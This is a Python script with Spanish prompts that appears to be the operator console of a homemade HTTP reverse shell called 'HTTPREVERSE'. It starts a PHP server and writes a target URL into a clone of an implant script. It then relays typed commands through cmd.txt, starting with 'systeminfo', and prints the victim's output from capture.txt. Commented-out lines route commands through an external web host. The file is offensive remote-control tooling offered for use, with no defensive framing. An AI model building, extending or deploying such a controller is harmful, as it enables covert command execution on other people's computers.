import os
import time
import platform

SYS=platform.system().lower()
#import http.server
#import socketserver
#import subprocess
#import requests


"""
headers={

    "Cache-Control":"no-cache"
}
"""

cmd_help="""
[HTTPREVERSE]->>[V.1.0]

ASSOC          Muestra o modifica las asociaciones de las extensiones
               de archivos.
ATTRIB         Muestra o cambia los atributos del archivo.
BREAK          Establece o elimina la comprobación extendida de Ctrl+C.
BCDEDIT        Establece propiedades en la base de datos de arranque para
               controlar la carga del arranque.
CACLS          Muestra o modifica las listas de control de acceso (ACLs)
               de archivos.
CALL           Llama a un programa por lotes desde otro.
CD             Muestra el nombre del directorio actual o cambia a otro
               directorio.
CHCP           Muestra o establece el número de página de códigos activa.
CHDIR          Muestra el nombre del directorio actual o cambia a otro
               directorio.
CHKDSK         Comprueba un disco y muestra un informe de su estado.
CHKNTFS        Muestra o modifica la comprobación de disco al arrancar.
CLS            Borra la pantalla.
CMD            Inicia una nueva instancia del intérprete de comandos
               de Windows
COLOR          Establece los colores de primer plano y fondo predeterminados
               de la consola.
COMP           Compara el contenido de dos archivos o un conjunto de archivos.
COMPACT        Muestra o cambia el estado de compresión de archivos
               en particiones NTFS.
CONVERT        Convierte volúmenes FAT a volúmenes NTFS. No puede convertir
               la unidad actual.
COPY           Copia uno o más archivos en otra ubicación.
DATE           Muestra o establece la fecha.
DEL            Elimina uno o más archivos.
DIR            Muestra una lista de archivos y subdirectorios en un
               directorio.
DISKPART       Muestra o configura las propiedades de partición de disco.
DOSKEY         Edita líneas de comando, recupera comandos de Windows y
               crea macros.
DRIVERQUERY    Muestra el estado y las propiedades actuales del controlador de dispositivo.
ECHO           Muestra mensajes, o activa y desactiva el eco.
ENDLOCAL       Termina la búsqueda de cambios de entorno en un archivo por lotes.
ERASE          Elimina uno o más archivos.
EXIT           Sale del programa CMD.EXE (intérprete de comandos).
FC             Compara dos archivos o conjunto de archivos y muestra las
               diferencias entre ellos.
FIND           Busca una cadena de texto en uno o más archivos.
FINDSTR        Busca cadenas en archivos.
FOR            Ejecuta el comando especificado para cada archivo en un conjunto de archivos.
FORMAT         Formatea un disco para usarse con Windows.
FSUTIL         Muestra o configura las propiedades del sistema de archivos.
FTYPE          Muestra o modifica los tipos de archivo usados en
               asociaciones de extensión de archivo.
GOTO           Direcciona el intérprete de comandos de Windows a una línea con etiqueta
               en un programa por lotes.
GPRESULT       Muestra información de directiva de grupo por equipo o usuario.
GRAFTABL       Permite a Windows mostrar un juego de caracteres extendidos
               en modo gráfico.
HELP           Proporciona información de Ayuda para los comandos de Windows.
ICACLS         Muestra, modifica, hace copias de seguridad o restaura listas de control de acceso (ACL) para archivos y
               directorios.
IF             Ejecuta procesos condicionales en programas por lotes.
LABEL          Crea, cambia o elimina la etiqueta del volumen de un disco.
MD             Crea un directorio.
MKDIR          Crea un directorio.
MKLINK         Crea vínculos simbólicos y vínculos físicos
MODE           Configura un dispositivo de sistema.
MORE           Muestra la información pantalla por pantalla.
MOVE           Mueve uno o más archivos de un directorio a otro en la
               misma unidad.
OPENFILES      Muestra archivos compartidos abiertos por usuarios remotos como recurso compartido de archivos.
PATH           Muestra o establece una ruta de búsqueda para archivos ejecutables.
PAUSE          Suspende el proceso de un archivo por lotes y muestra un mensaje.
POPD           Restaura el valor anterior del directorio actual guardado
               por PUSHD.
PRINT          Imprime un archivo de texto.
PROMPT         Cambia el símbolo de comandos de Windows.
PUSHD          Guarda el directorio actual y después lo cambia.
RD             Quita un directorio.
RECOVER        Recupera la información legible de un disco dañado o defectuoso.
REM            Registra comentarios (notas) en archivos por lotes o CONFIG.SYS.
REN            Cambia el nombre de uno o más archivos.
RENAME         Cambia el nombre de uno o más archivos.
REPLACE        Reemplaza archivos.
RMDIR          Quita un directorio.
ROBOCOPY       Utilidad avanzada para copiar archivos y árboles de directorios
SET            Muestra, establece o quita variables de entorno de Windows.
SETLOCAL       Inicia la localización de los cambios de entorno en un archivo por lotes.
SC             Muestra o configura servicios (procesos en segundo plano).
SCHTASKS       Programa comandos y programas para ejecutarse en un equipo.
SHIFT          Cambia la posición de parámetros reemplazables en archivos por lotes.
SHUTDOWN       Permite el apagado local o remoto de un equipo.
SORT           Ordena la salida.
START          Inicia otra ventana para ejecutar un programa o comando especificado.
SUBST          Asocia una ruta de acceso con una letra de unidad.
SYSTEMINFO     Muestra las propiedades y la configuración específicas del equipo.
TASKLIST       Muestra todas las tareas en ejecución, incluidos los servicios.
TASKKILL       Termina o interrumpe un proceso o aplicación que se está ejecutando.
TIME           Muestra o establece la hora del sistema.
TITLE          Establece el título de la ventana de una sesión de CMD.EXE.
TREE           Muestra gráficamente la estructura de directorios de una unidad o
               ruta de acceso.
TYPE           Muestra el contenido de un archivo de texto.
VER            Muestra la versión de Windows.
VERIFY         Comunica a Windows si debe comprobar que los archivos se escriben
               de forma correcta en un disco.
VOL            Muestra la etiqueta del volumen y el número de serie del disco.
XCOPY          Copia archivos y árboles de directorios.
WMIC           Muestra información de WMI en el shell de comandos interactivo.

[ESTA VISION ES DESDE TU MAQUINA]
"""

inicio=open("cmd.txt", "w")
inicio.write("systeminfo")
inicio.close()

def server():
    try:

        """
        pausa=int(input("[SERVER IN] [01] GNU/LINUX [02] WINDOWS ->>"))

        while pausa < 1 and pausa > 2:
            pausa=int(input("[SERVER IN] [01] GNU/LINUX [02] WINDOWS ->>"))
        """

        if SYS != "windows":
            pausa=1
        else:
            pausa=2
        
        port=int(input("[PORT] PUERTO A USAR [8080]: "))
        

        while port == 0:
            port=int(input("[PORT] PUERTO A USAR [8080]: "))

    except:
        pass
    else:
        if pausa == 1:

            try:
                print('[SERVER] CORRIENDO EN ->> http://localhost:{}'.format(port))
                os.system("php -S localhost:{}".format(port))
                #php_execute=subprocess.Popen("php -S localhost:{}".format(port), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                """
                with socketserver.TCPServer(('', 8080), http.server.SimpleHTTPRequestHandler) as httpd:
                    print('[SERVER] CORRIENDO EN ->> http://localhost:{}'.format(8080))
                    httpd.serve_forever()
                """
            except:
                print("[ERROR] ALGO SUCEDIO")
                pass
        else:
            print("[EN DESARROLLO]")
    #os.system("python3 -m http.server 8080")

def maquina():
    pasado=""

    print("[TERMINAL] ESPERANDO CONEXION")
    while True:
        time.sleep(1)

        try:
            #obtener_resultado=requests.get("https://testreversehttp.webcindario.com/capture.txt", headers=headers)
            lectura=open("capture.txt")
            leer=lectura.read()
            lectura.close()
            
        except:
            leer=""
            pass
        else:
            nuevo=str(leer)

            if nuevo != "" and nuevo != pasado:
                pasado=nuevo
                print(nuevo.replace("[ESP]", " ").replace("\\r\\n","\n"))

                comando=input("reverchttp ->>")

                if comando == "exit":
                    break
                if comando == "help":
                    print(cmd_help)  # NUEVA LINEA... PROBAR MAÑANA
                    pass

                data=open("cmd.txt", "w")
                data.write(comando)
                data.close()

                """
                data={
                    "cmd":"{}".format(comando)
                }                                               DESCOMENTAR SI SE USARA UN HOST ONLINE EXTERNO (MUY LENTO)
                
                try:

                    
                    obtener_resultado=requests.post("YOU_URL/cmd_reverse.php", data=data)
                    
                except:
                    pass
                
                else:
                    pass
                """
            else:
                pass

def creacion(server_str):

    try:

        if "0/" not in server_str:
            server_str=server_str+"/"

        leer=open("reversehttp.py")
        leer_str=leer.read()
        leer.close()

        escribir=open("reversehttp_clone.py", "w")
        escribir.write(leer_str.replace("URL_FUN",server_str))
        escribir.close()

    except:
        return "[ERROR] ALGO SUCEDIO"
    else:
        return "[SAVE] REVERSEHTTP_CLONE.PY GUARDADO EN ./SCRIPTS/REVERSEHTTP/"

try:
    selec=input("[QUEST] YA CREASTE EL HOST LOCAL? [S/N]: ").lower()

    while selec != "s" and selec != "n":
        selec=input("[QUEST] YA CREASTE EL HOST LOCAL? [S/N]: ").lower()
except:
    pass

else:

    if selec == "n":
        server()
    else:
        try:
            server_str=input("[URL] INTRODUCE LA URL LOCAL O PUBLICA: ")
            
            while len(server_str) == 0:
                server_str=input("[URL] INTRODUCE LA URL LOCAL O PUBLICA: ")
        except:
            pass

        else:
            print(creacion(server_str))
            pausa=input("[TERMINAL] PRESIONA ENTER PARA CONTINUAR ->>")
            maquina()
